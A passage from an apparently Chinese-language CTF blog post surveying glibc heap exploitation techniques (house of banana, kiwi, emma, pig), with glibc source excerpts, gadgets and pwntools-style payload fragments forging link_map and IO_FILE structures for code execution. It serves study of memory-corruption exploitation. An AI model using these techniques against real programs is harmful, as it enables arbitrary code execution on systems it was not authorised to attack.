class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>2.27打onegadget：</strong></p>
<ul>
<li><p>link_map：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">link_map=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(libc_base+<span class="number">0x61c710</span>)#l_next</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)#l_real</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">8</span>)#<span class="comment">//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(one_gadget)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0x800000000</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="相关技巧-16"><a href="#相关技巧-16" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>伪造 <code>fini_array</code> 数组的时候，是从后往前遍历的</li>
<li>有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破</li>
<li>如果不想逐个伪造，可以直接用 <code>gdb</code> 从内存里面 <code>dump</code> 出来，然后基于偏移修改内存即可</li>
</ul>
<h3 id="利用效果-15"><a href="#利用效果-15" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意代码执行</li>
</ul>
<h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><h3 id="漏洞成因-17"><a href="#漏洞成因-17" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-17"><a href="#适用范围-17" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>——<code>2.36</code></li>
<li>在 <code>malloc</code> 流程中触发 <code>assert</code></li>
</ul>
<h3 id="利用原理-17"><a href="#利用原理-17" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是提供了一种在程序中调用 <code>IO</code> 流函数的思路：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> IS_IN (libc)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到，调用到了 <code>fxprintf</code> 和 <code>fflush(stderr)</code>。对stderr进行劫持</p>
<p>在<code>_int_malloc</code>中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这个对top进行了assert判断</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_size &gt;= <span class="number">0x20</span>;</span><br><span class="line">old_top.prev_inuse = <span class="number">0</span>;</span><br><span class="line">old_top页对齐</span><br></pre></td></tr></table></figure>

<p>因此只要堆溢出改个size就可以触发assert了</p>
<p>在<code>__fxprintf</code>函数中调用的是偏移0x38的指针</p>
<p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针</p>
<p>因此有以下的利用：</p>
<ul>
<li>通过largebin attack劫持stderr指针</li>
<li>通过堆溢出或其他手法触发assert</li>
<li>修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code></li>
<li>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移(感觉条件要求好多，但是对于assert触发的IO可以利用)</li>
</ul>
<h3 id="利用效果-16"><a href="#利用效果-16" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>触发 <code>IO</code> 处理流程，为后续利用做准备</li>
</ul>
<h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><h3 id="漏洞成因-18"><a href="#漏洞成因-18" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-18"><a href="#适用范围-18" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以进行两次 <code>largebin attack</code></li>
<li>或者可以进行两次任意地址写堆地址</li>
<li>可以触发 <code>IO</code> 流操作</li>
</ul>
<h3 id="利用原理-18"><a href="#利用原理-18" class="headerlink" title="利用原理"></a>利用原理</h3><p>在vtable的合法范围之内，存在<code>_IO_cookie_jumps</code>，可以通过偏移来调用vtable表里的所有函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write; <span class="comment">//0xf0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">	   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">	       == <span class="number">-1</span>)</span><br><span class="line">	   || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">	  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这四个函数作为我们考虑范围内的函数，发现其中调用的函数都是<code>_IO_cookie_file</code>的一个成员</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;		<span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;	<span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;		<span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;	<span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure>

<p>但是我们发现</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>在Glibc2.34及以上版本中的函数都进行了指针加密</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e06774</span> &lt;_IO_cookie_write+<span class="number">20</span>&gt;:        ror    rax,<span class="number">0x11</span></span><br><span class="line"><span class="number">0x7ffff7e06778</span> &lt;_IO_cookie_write+<span class="number">24</span>&gt;:        <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span></span><br></pre></td></tr></table></figure>

<p>显示右移0x11位，然后和tls里的一个数据进行了异或，因此我们只需要通过TSU，largebin attack等的手法将其改为一个特定的值，就能进行绕过，反正要么泄露要么覆盖，只要能成就行</p>
<p>因此，利用思路如下：</p>
<ul>
<li>截至某个 <code>IO_FILE</code> 的指针（<code>IO_list_all/stdxxx-&gt;chain</code> 等都可以）为堆地址</li>
<li>堆上伪造 <code>IO_FILE</code> 结构，其 <code>vtable</code> 替换为<code>_IO_cookie_jumps+XX</code>，<code>XX</code> 为一个偏移量</li>
<li>伪造好函数指针和调用参数，指针需要循环异或和加密（在执行<code>_IO_cookie_write</code>的时候，rdi是fake_iofile，因此可以通过gadget来ROP）</li>
<li>调用到<code>_IO_cookie_read</code> 等函数，进而执行任意函数</li>
</ul>
<h3 id="相关技巧-17"><a href="#相关技巧-17" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li><p>常用的 <code>gadget</code> 有：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;栈迁移</span><br><span class="line">mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]</span><br><span class="line">lea    r13,[rbp+<span class="number">0x10</span>]</span><br><span class="line">mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span></span><br><span class="line">mov    rdi,r13</span><br><span class="line">call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; rdi转rdx</span><br><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]</span><br><span class="line">mov qword ptr [rsp], rax</span><br><span class="line">call qword ptr [rdx + <span class="number">0x20</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pointer_guard</code> 就在 <code>canary</code> 下面，偏移可能需要爆破</p>
</li>
</ul>
<h3 id="利用效果-17"><a href="#利用效果-17" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意函数执行</li>
</ul>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>2021 湖湘杯的 House OF Emma</p>
<h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><h3 id="漏洞成因-19"><a href="#漏洞成因-19" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-19"><a href="#适用范围-19" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以进行 <code>largebin attack</code></li>
<li>可以触发 <code>IO</code> 流操作</li>
</ul>
<h3 id="利用原理-19"><a href="#利用原理-19" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_str_jumps</code> 中，存在着<code>_IO_str_overflow</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 覆盖到这里</span></span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 调用malloc</span></span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// 调用memecpy，覆盖</span></span><br><span class="line">	      <span class="built_in">free</span> (old_buf); <span class="comment">// 调用free</span></span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      <span class="comment">//......</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure>

<p>只需要合理控制<code>_IO_buf_end</code>和<code>_IO_buf_base</code>就可以实现chunk的size可控，只要分配出来的chunk也可控，那么就可以在任意地址任意写</p>
<p>利用流程如下：</p>
<ul>
<li>先通过largebin attack将想控制的chunk_addr+0x18写上一个堆地址，然后通过tcache stashing unlink+使得分配的chunk可控</li>
<li>伪造一个<code>_IO_FILE_plus</code>结构，其vtable指向<code>_IO_str_jumps</code></li>
<li>然后伪造的<code>_IO_buf_base</code>为想写入的值的起点（所以要先在已知地址写入想写入的数据），之后合理控制<code>_IO_buf_end</code>实现控制分配chunk的大小</li>
<li>在 <code>memcpy</code> 中覆盖地址，如可以覆盖<code>__malloc_hook/__free_hook</code> 等</li>
</ul>
